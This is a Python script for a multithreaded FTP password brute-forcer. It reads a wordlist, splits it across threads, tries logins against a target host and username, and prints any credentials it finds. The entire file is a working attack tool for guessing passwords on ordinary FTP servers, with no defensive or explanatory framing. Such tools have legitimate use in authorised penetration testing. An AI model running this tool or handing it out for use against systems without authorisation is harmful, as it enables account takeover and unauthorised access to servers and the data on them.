from ftplib import FTP, error_reply, error_perm
from termcolor import colored
import argparse
import concurrent.futures
from threading import Event
from socket import timeout
from wordlists import chunk_wordlist
from socket import timeout

def connect_to_ftp(target_host, ftp_port, username, password, event, show_attempts, ftp):
    try:
        ftp.connect(target_host, port=ftp_port) 
        ftp.login(user=username, passwd=password)
        print(colored(("[+] Found password: {}".format(password)), 'light_green'))
        print(colored(("[++] FTP Credentials: {}:{}".format(username,password)), 'blue'))
        event.set()
        ftp.quit()
    except error_perm:
        if not event.is_set() and show_attempts:
            print(colored(("[-] Incorrect password: {}".format(password)), 'light_red'))
        ftp.quit()
    except error_reply:
        print(colored("[--] Unexpected reply received from the target", 'red'))
        event.set()

    except timeout:
        print(colored("[--] Connection timed out. Verify the target host and port!", 'red'))

    except Exception as e:
        print(colored("[---] Unexpected exception has occurred...", 'red'))
        print(e)




def brute_force_ftp(target_host, ftp_port, username, wordlist_chunk, event, show_attempts):
    ftp = FTP(timeout=5)
    for password in wordlist_chunk:
        if not event.is_set():
            connect_to_ftp(target_host, ftp_port, username, password[0], event, show_attempts, ftp)
         

def main():
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("target_host", help="Specify target host", type=str)
    parser.add_argument("-p", default=21, dest="ftp_port", help="FTP server port", type=int)
    parser.add_argument('-u', dest='username', help='Username', type=str, required=True)
    parser.add_argument('-w', dest='wordlist', help='Wordlist with passwords', type=str, required=True)
    parser.add_argument('-t', dest='threads', help='Number of concurrent connections', type=int, default=8)
    parser.add_argument('-a', dest='show_attempts', help='Show all attempted logins', default=False, action='store_true')
    args = parser.parse_args()
    all_wordlist_chunks = chunk_wordlist(args.wordlist, args.threads)
    finished = Event()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        for wordlist_chunk in all_wordlist_chunks:
            executor.submit(brute_force_ftp, args.target_host, args.ftp_port, args.username, wordlist_chunk, finished, args.show_attempts)




if __name__ == '__main__':
	main()
